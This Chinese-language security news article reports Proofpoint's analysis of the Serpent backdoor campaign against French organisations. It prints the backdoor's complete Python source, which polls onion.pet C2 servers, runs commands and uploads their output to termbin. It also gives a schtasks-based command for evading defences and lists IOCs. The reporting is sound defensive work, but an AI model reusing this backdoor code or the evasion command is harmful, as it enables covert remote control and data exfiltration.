近期，研究人员观察到一个针对法国建筑公司和政府部门的攻击行动，攻击者使用带有宏代码的恶意 Word 文档分发 Chocolatey
安装程序。值得注意的是，VBA 宏代码中有攻击者绘制的字符画。攻击者会在失陷主机上安装后门 Serpent，但攻击者的意图尚不明确。

![image.png-65.3kB](https://image.3001.net/images/20220324/1648112043_623c31ab59832fab64368.png!small)字符画

## 详情

攻击者在攻击中使用法语，如下所示：

> From: "Jeanne"  
> Subject "Candidature - Jeanne Vrakele"

邮件包含一个带有宏代码的恶意 Word 文档，诱饵内容与欧盟通用数据保护条例（GDPR）有关。

![image.png-233kB](https://image.3001.net/images/20220324/1648112043_623c31abebea2cc30d746.png!small)诱饵文档

文档打开后通过 `https://www.fhccu.com/images/ship3.jpg`下载图片，图片使用了隐写术隐藏了一个 PowerShell
脚本。利用该 PowerShell 脚本下载、安装与更新 Chocolatey 安装程序与其他脚本，此前没有观察到攻击者使用 Chocolatey。

通过 Chocolatey 安装 Python 与各种依赖（如 PySocks 等），使失陷主机可以通过 SOCKS 与 HTTP 代理转发流量。

![image.png-493.6kB](https://image.3001.net/images/20220324/1648112044_623c31acb1d26c1e42d9c.png!small)隐写图片

接着拉取的 `https://www.fhccu.com/images/7.jpg`中也使用隐写术隐藏了 base64 编码的 Python 脚本
MicrosoftSecurityUpdate.py，该脚本用于创建并执行 .bat 文件与 Python 脚本。

Python 脚本如下所示：

    
    
    #!/usr/bin/python3from subprocess import Popen, PIPE, STDOUTimport requestsimport reimport socketimport timecmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html'cmd_url_answer = 'http://gg-fwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'hostname = socket.gethostname()hostname_pattern = 'host:%s-00' % hostnameheaders = {}referer = {'Referer': hostname_pattern}cache_control = {'Cache-Control': 'no-cache'}headers.update(referer)headers.update(cache_control)check_cmd_1 = ''def recvall(sock, n):data = b''while len(data) < n:packet = sock.recv(n - len(data))if not packet:return Nonedata += packetreturn datadef get_cmd():req = requests.get(cmd_url_order, headers=headers).content.decode().strip()if req == '':passelse:return reqdef run_cmd(cmd):cmd_split = cmd.split('--')if cmd_split[1] == hostname:cmd = cmd_split[2]print(cmd)run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()out = run.stdout.read()if not out:out = b'ok'termbin_cnx = socks.socksocket()termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)termbin_cnx.connect(('termbin.com', 9999))termbin_cnx.send(out)recv = termbin_cnx.recv(100000)termbin_url_created = recv.decode().rstrip('\x00').strip()print(termbin_url_created)termbin_header = {'Referer': hostname_pattern+" -- "+termbin_url_created}headers.update(termbin_header)try:push = requests.get(cmd_url_answer, headers=headers)print('executed')headers.update(referer)except Exception as e:print(e)passelse:print('not for me')while True:time.sleep(10)try:check_cmd = get_cmd()if check_cmd != check_cmd_1:time.sleep(20)print(check_cmd)run_cmd(check_cmd)check_cmd_1 = check_cmdpassexcept Exception as e:print(e)pass﻿

Serpent 后门会定时轮询 ping 攻击者的服务器，等待 `<random
integer>--<hostname>--<command>`形式的响应。如果 `<hostname>`与失陷主机的主机名相同，则运行
`<command>`。攻击者使用 PySocks 连接到 Termbin，将命令执行的输出上传。最后，将存储数据的 URL
回传给攻击者，让攻击者查看执行结果。

![image.png-205.5kB](https://image.3001.net/images/20220324/1648112045_623c31adeb7a4549a79ec.png!small)执行链

两个使用隐写的图片都部署在牙买加信用合作社的网站上：

![image.png-619kB](https://image.3001.net/images/20220324/1648112046_623c31aebfdf8bde374f0.png!small)隐写图片

攻击者使用 Tor 作为 C&C 的基础设施：

    
    
    http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html

## 其他工具

除了以上恶意软件，还发现了其他恶意软件。例如使用 schtasks.exe 签名二进制代理执行的新恶意软件，这是一种绕过安全防护措施的手段。

命令如下所示：

    
    
    schtasks.exe /CREATE /SC ONEVENT /EC application /mo *[System/EventID=777] /f /TN run /TR "calc.exe" & EVENTCREATE /ID 777 /L APPLICATION /T INFORMATION /SO DummyEvent /D "Initiatescheduled task." &  schtasks.exe /DELETE /TN run /f

命令利用 schtasks.exe 创建一次性任务来调用可执行文件，该命令随后会创建一个虚拟事件来触发任务并从任务调度程序中删除该任务。这样，会作为
taskhostsw.exe 的子进程执行，而 taskhostsw.exe 是签名的 Windows 二进制文件。

## 威胁

攻击者的独特行为表明这可能是一个高级的、定向的攻击，这种绕过安全防护措施的方法是独一无二的。研究人员此前很少在攻击中应用隐写术，使用
schtasks.exe 执行程序的方式也是天下独一份的。

但 Proofpoint 的研究人员并未将其与已知攻击者关联起来，尽管攻击者的目的尚不明确，但攻击者通过后门可以执行很多恶意行动。

## IOC

    
    
    https://www.fhccu.com/images/ship3.jpghttps://www.fhccu.com/images/7.jpghttp://gg/fwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.htmlhttp://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.htmlhttp://shorturl.at/qzES8jeanne.vrakele@gmail.comjean.dupontel@protonmail.comno-reply@dgfip-nanterre.comf988e252551fe83b5fc3749e1d844c31fad60be0c25e546c80dbb9923e03eaf2ec8c8c44eae3360be03e88a4bc7bb03f3de8d0a298bff7250941776fcea9faab8912f7255b8f091e90083e584709cf0c69a9b55e09587f5927c9ac39447d6a19

## 参考来源

> [Proofpoint](https://www.proofpoint.com/us/blog/threat-insight/serpent-no-> swiping-new-backdoor-targets-french-entities-unique-attack-chain)

